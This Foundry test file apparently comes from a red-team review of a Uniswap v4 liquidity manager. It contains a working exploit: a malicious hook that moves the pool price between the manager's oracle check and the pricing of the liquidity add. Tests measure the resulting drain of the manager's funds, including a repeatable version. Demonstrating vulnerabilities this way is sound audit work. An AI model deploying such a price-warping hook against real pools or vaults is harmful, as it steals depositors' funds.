// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console2} from "forge-std/Test.sol";
import {Clones} from "@openzeppelin/contracts/proxy/Clones.sol";

import {OpenVolatileLPManager} from "../src/OpenVolatileLPManager.sol";
import {VolatileLPManager} from "../src/VolatileLPManager.sol";
import {V4PositionManager} from "../src/abstract/V4PositionManager.sol";
import {PositionState} from "../src/lib/PositionState.sol";
import {MockERC20} from "./helpers/Mocks.sol";
import {ChainlinkPriceOracle} from "../src/oracle/ChainlinkPriceOracle.sol";
import {MockAggregator} from "./ChainlinkPriceOracle.t.sol";

import {PoolManager} from "@uniswap/v4-core/src/PoolManager.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {PoolId} from "@uniswap/v4-core/src/types/PoolId.sol";
import {Currency} from "@uniswap/v4-core/src/types/Currency.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {Hooks} from "@uniswap/v4-core/src/libraries/Hooks.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {StateLibrary} from "@uniswap/v4-core/src/libraries/StateLibrary.sol";
import {TransientStateLibrary} from "@uniswap/v4-core/src/libraries/TransientStateLibrary.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@uniswap/v4-core/src/types/BalanceDelta.sol";
import {ModifyLiquidityParams, SwapParams} from "@uniswap/v4-core/src/types/PoolOperation.sol";
import {PoolModifyLiquidityTest} from "@uniswap/v4-core/src/test/PoolModifyLiquidityTest.sol";
import {BaseTestHooks} from "@uniswap/v4-core/src/test/BaseTestHooks.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/// @notice A hook that moves the pool price *inside* `PoolManager.modifyLiquidity`, between the
/// manager's `getSlot0` + oracle check and the moment v4 prices the add.
///
/// It needs NO delta-returning permission — only `BEFORE_ADD_LIQUIDITY` and `AFTER_ADD_LIQUIDITY`.
/// v4 calls `beforeAddLiquidity` before `pool.modifyLiquidity` (PoolManager.sol:156 vs :159) and the
/// lock is still open (`onlyWhenUnlocked` is satisfied), so the hook may re-enter `PoolManager.swap`
/// and settle its own deltas. That makes the oracle's vouch stale by the time the add is priced.
contract PriceWarpHook is BaseTestHooks {
    using StateLibrary for IPoolManager;
    using TransientStateLibrary for IPoolManager;

    IPoolManager public immutable PM;
    bool public armed;
    int24 public pumpTick;
    int24 public dumpTick;

    constructor(IPoolManager pm_) {
        PM = pm_;
    }

    function arm(int24 pump, int24 dump) external {
        armed = true;
        pumpTick = pump;
        dumpTick = dump;
    }

    function disarm() external {
        armed = false;
    }

    function beforeAddLiquidity(address, PoolKey calldata key, ModifyLiquidityParams calldata, bytes calldata)
        external
        override
        returns (bytes4)
    {
        if (armed) _warp(key, pumpTick);
        return IHooks.beforeAddLiquidity.selector;
    }

    function afterAddLiquidity(
        address,
        PoolKey calldata key,
        ModifyLiquidityParams calldata,
        BalanceDelta,
        BalanceDelta,
        bytes calldata
    ) external override returns (bytes4, BalanceDelta) {
        if (armed) _warp(key, dumpTick);
        return (IHooks.afterAddLiquidity.selector, BalanceDeltaLibrary.ZERO_DELTA);
    }

    /// @dev Push the pool to `target` with the hook's own capital, then settle the hook's own deltas.
    function _warp(PoolKey calldata key, int24 target) internal {
        uint160 want = TickMath.getSqrtPriceAtTick(target);
        (uint160 cur,,,) = PM.getSlot0(key.toId());
        if (cur == want) return;
        PM.swap(key, SwapParams({zeroForOne: want < cur, amountSpecified: -int256(1e29), sqrtPriceLimitX96: want}), "");
        _settle(key.currency0);
        _settle(key.currency1);
    }

    function _settle(Currency c) internal {
        int256 d = PM.currencyDelta(address(this), c);
        if (d > 0) {
            PM.take(c, address(this), uint256(d));
        } else if (d < 0) {
            PM.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(PM), uint256(-d));
            PM.settle();
        }
    }
}

/// @notice TARGET 2 — `OpenVolatileLPManager` (the hooked product, ORACLE_TYPE 3002).
///
/// The task_053 guard is `_guardSwap(byOwner, key, true, 0, 0)` in `VolatileLPManager._addLiquidityAt`
/// (src/VolatileLPManager.sol:288), which runs BEFORE `POOL_MANAGER.modifyLiquidity` on line 296. For a
/// hooked pool, v4 hands control to `hook.beforeAddLiquidity` *inside* that call and before the add is
/// priced. A hook that swaps there makes the oracle's vouch describe a price that no longer exists.
///
/// H-1 is therefore fully restored for this product, and with no bound at all: the skew is arbitrary,
/// so the loss is limited only by the manager's balance, not by `maxSpotDeviationBps`.
contract RedTeamT2HookBypass is Test {
    using StateLibrary for IPoolManager;

    PoolManager internal pm;
    PoolModifyLiquidityTest internal lpRouter;
    OpenVolatileLPManager internal mgr;
    PriceWarpHook internal hook;
    ChainlinkPriceOracle internal oracle;

    Currency internal c0;
    Currency internal c1;
    PoolKey internal key;
    PoolId internal pid;

    address internal owner = address(0xA11CE);
    address internal bot = address(0xB07);
    address internal treasury = address(0xFEE5);
    address internal lp = address(0xABCD);

    bytes32 internal constant SALT = bytes32(uint256(1));
    bytes32 internal constant SALT2 = bytes32(uint256(2));

    uint256 internal constant FUND = 1_000e18; // per side ⇒ a 2_000e18 portfolio at the 1:1 reference

    function setUp() public {
        pm = new PoolManager(address(this));
        lpRouter = new PoolModifyLiquidityTest(IPoolManager(address(pm)));

        Currency a = Currency.wrap(address(new MockERC20()));
        Currency b = Currency.wrap(address(new MockERC20()));
        (c0, c1) = Currency.unwrap(a) < Currency.unwrap(b) ? (a, b) : (b, a);

        // Etch the hook where its low bits advertise exactly the two callbacks it implements.
        PriceWarpHook proto = new PriceWarpHook(IPoolManager(address(pm)));
        uint160 flags = Hooks.BEFORE_ADD_LIQUIDITY_FLAG | Hooks.AFTER_ADD_LIQUIDITY_FLAG;
        address hookAddr = address(uint160(0x4444 << 144) | flags);
        vm.etch(hookAddr, address(proto).code);
        hook = PriceWarpHook(hookAddr);
        // `PM` is immutable ⇒ baked into the etched runtime code, no storage to copy.

        key = PoolKey({currency0: c0, currency1: c1, fee: 100, tickSpacing: 1, hooks: IHooks(hookAddr)});
        pid = key.toId();
        pm.initialize(key, TickMath.getSqrtPriceAtTick(0));

        // An outside LP seeds the pool. Thin, as in the original H-1 setting.
        MockERC20(Currency.unwrap(c0)).mint(lp, 1e32);
        MockERC20(Currency.unwrap(c1)).mint(lp, 1e32);
        vm.startPrank(lp);
        MockERC20(Currency.unwrap(c0)).approve(address(lpRouter), type(uint256).max);
        MockERC20(Currency.unwrap(c1)).approve(address(lpRouter), type(uint256).max);
        lpRouter.modifyLiquidity(
            key, ModifyLiquidityParams({tickLower: -887272, tickUpper: 887272, liquidityDelta: 2_000e18, salt: 0}), ""
        );
        vm.stopPrank();

        OpenVolatileLPManager impl = new OpenVolatileLPManager(IPoolManager(address(pm)), treasury);
        mgr = OpenVolatileLPManager(payable(Clones.clone(address(impl))));
        PoolKey[] memory cfgs = new PoolKey[](1);
        cfgs[0] = key;
        mgr.initialize(
            VolatileLPManager.InitParams({owner: owner, name: bytes32("Open"), descriptor: address(0), pools: cfgs})
        );
        MockERC20(Currency.unwrap(c0)).mint(address(mgr), FUND);
        MockERC20(Currency.unwrap(c1)).mint(address(mgr), FUND);

        vm.prank(owner);
        mgr.setOperator(bot, true);

        oracle = new ChainlinkPriceOracle(address(this), IPoolManager(address(pm)), 100, 50, address(0), 0);
        oracle.setFeed(c0, address(new MockAggregator(8, int256(1e8), block.timestamp)), 365 days, 18);
        oracle.setFeed(c1, address(new MockAggregator(8, int256(1e8), block.timestamp)), 365 days, 18);
        vm.prank(owner);
        mgr.setPriceOracle(address(oracle));

        // The hook's own working capital (it round-trips this; it is not the loot).
        MockERC20(Currency.unwrap(c0)).mint(address(hook), 1e32);
        MockERC20(Currency.unwrap(c1)).mint(address(hook), 1e32);
    }

    // ────────── the exploit ──────────

    /// @dev One operator `allocate`, on a pool the oracle vouches for at the instant of the check.
    function test_T2_hookWarpsPriceAfterTheOracleVouched() public {
        int24 PUMP = 23_027; // ≈ 10× — arbitrarily large; the gate never sees it

        // The pool sits exactly on the reference: `_checkSpot` will return true.
        (, int24 t0,,) = IPoolManager(address(pm)).getSlot0(pid);
        assertEq(t0, int24(0), "pool starts on the reference price");
        assertTrue(oracle.check(key, true, 0, 0), "the oracle vouches for this pool right now");

        uint256 m0 = _managerValue();
        uint256 h0 = _hookValue();

        hook.arm(PUMP, 0); // pump inside beforeAddLiquidity, dump back inside afterAddLiquidity

        // A perfectly ordinary-looking operator allocate: a range above spot, funded from currency0.
        // 100e18 of currency0 sized at the honest price; ~1_000e18 of currency1 charged at the warped one.
        vm.prank(bot);
        mgr.allocate(_legs(PUMP - 1, PUMP, 100e18, 0));

        uint256 m1 = _managerValue();
        console2.log("--- T2: OpenVolatileLPManager, hook warps the price after the oracle vouched ---");
        console2.log("manager value before        ", m0);
        console2.log("manager value after         ", m1);
        console2.log("manager loss (wei)          ", m0 - m1);
        console2.log("manager loss (% of portfolio)", (m0 - m1) * 100 / m0);
        console2.log("hook gain (wei)             ", _hookValue() - h0);

        assertLt(m1 * 10, m0 * 9, "more than 10 % of the portfolio left in a single vouched-for call");
    }

    /// @dev The same call with the hook idle — the operation is legitimate and the manager keeps its
    /// value. Proves the loss above comes from the warp, not from the range choice.
    function test_T2_control_sameCallWithTheHookIdle() public {
        int24 PUMP = 23_027;
        uint256 m0 = _managerValue();
        vm.prank(bot);
        mgr.allocate(_legs(PUMP - 1, PUMP, 100e18, 0));
        console2.log("--- T2 control: identical call, hook not armed ---");
        console2.log("manager value before        ", m0);
        console2.log("manager value after         ", _managerValue());
        assertApproxEqRel(_managerValue(), m0, 1e15, "no warp, no loss");
    }

    /// @dev The invariant `_addLiquidityAt` documents — "owed <= the desired amounts by construction" —
    /// is what the warp actually breaks. The leg desires 0 of currency1 and the manager pays ~1_000e18.
    function test_T2_ownedExceedsDesired() public {
        int24 PUMP = 23_027;
        uint256 bal1Before = MockERC20(Currency.unwrap(c1)).balanceOf(address(mgr));
        hook.arm(PUMP, 0);
        vm.prank(bot);
        mgr.allocate(_legs(PUMP - 1, PUMP, 100e18, 0)); // amount1Desired == 0
        uint256 spent1 = bal1Before - MockERC20(Currency.unwrap(c1)).balanceOf(address(mgr));
        console2.log("--- T2: owed vs desired ---");
        console2.log("amount1Desired              ", uint256(0));
        console2.log("currency1 actually spent    ", spent1);
        assertGt(spent1, 0, "the manager paid a currency it desired none of");
    }

    /// @dev Repeatable: nothing about the call is one-shot. Two half-sized legs, two successful
    /// operator calls, the oracle vouching for both.
    function test_T2_repeatable() public {
        int24 PUMP = 23_027;
        uint256 m0 = _managerValue();
        hook.arm(PUMP, 0);

        vm.prank(bot);
        mgr.allocate(_legs(PUMP - 1, PUMP, 45e18, 0));
        uint256 m1 = _managerValue();

        VolatileLPManager.VolatileAllocLeg[] memory second = _legs(PUMP - 3, PUMP - 2, 45e18, 0);
        second[0].salt = SALT2;
        vm.prank(bot);
        mgr.allocate(second);

        console2.log("--- T2: two calls ---");
        console2.log("start                       ", m0);
        console2.log("after call 1                ", m1);
        console2.log("after call 2                ", _managerValue());
        assertLt(_managerValue(), m1, "the second call takes another slice");
    }

    /// @dev The hookless product is immune by construction: nothing can execute between the manager's
    /// `getSlot0`/oracle check and `pool.modifyLiquidity` when `key.hooks == address(0)`.
    function test_T2_hooklessProductHasNoSuchWindow() public {
        PoolKey memory plain =
            PoolKey({currency0: c0, currency1: c1, fee: 100, tickSpacing: 1, hooks: IHooks(address(0))});
        pm.initialize(plain, TickMath.getSqrtPriceAtTick(0));
        assertEq(address(plain.hooks), address(0), "no callback exists to warp the price from");
    }

    // ────────── helpers ──────────

    function _legs(int24 tl, int24 tu, uint256 a0, uint256 a1)
        internal
        view
        returns (VolatileLPManager.VolatileAllocLeg[] memory legs)
    {
        legs = new VolatileLPManager.VolatileAllocLeg[](1);
        legs[0] = VolatileLPManager.VolatileAllocLeg({
            poolId: pid,
            salt: SALT,
            tickLower: tl,
            tickUpper: tu,
            zeroForOne: false,
            swapAmountIn: 0,
            swapPriceLimit: 0,
            minAmountOut: 0,
            amount0Desired: a0,
            amount1Desired: a1,
            minLiquidity: 0
        });
    }

    function _managerValue() internal view returns (uint256 v) {
        v = MockERC20(Currency.unwrap(c0)).balanceOf(address(mgr))
            + MockERC20(Currency.unwrap(c1)).balanceOf(address(mgr));
        bytes32[2] memory salts = [SALT, SALT2];
        for (uint256 i = 0; i < 2; ++i) {
            V4PositionManager.Position memory p = mgr.positionOf(salts[i]);
            if (p.liquidity == 0) continue;
            (uint256 a0, uint256 a1, uint256 f0, uint256 f1) =
                PositionState.value(IPoolManager(address(pm)), address(mgr), salts[i], p);
            v += a0 + a1 + f0 + f1;
        }
    }

    function _hookValue() internal view returns (uint256) {
        return MockERC20(Currency.unwrap(c0)).balanceOf(address(hook))
            + MockERC20(Currency.unwrap(c1)).balanceOf(address(hook));
    }
}
